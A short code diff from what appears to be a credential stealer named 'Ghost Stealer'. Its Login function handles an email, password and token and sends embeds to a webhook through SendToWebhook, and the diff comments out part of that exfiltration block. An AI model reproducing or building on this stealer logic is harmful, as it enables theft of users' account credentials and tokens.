@@ -222,6 +222,7 @@ function Login(email, password, token) {
                 }
             ]
         };
+	/*
         const hqlistt = {
           username: "Ghost Stealer",
           content: "",
@@ -276,7 +277,7 @@ function Login(email, password, token) {
             ]
           }
           SendToWebhook(JSON.stringify(mfaembed))
-        }
+        }*/
     })
 }
 
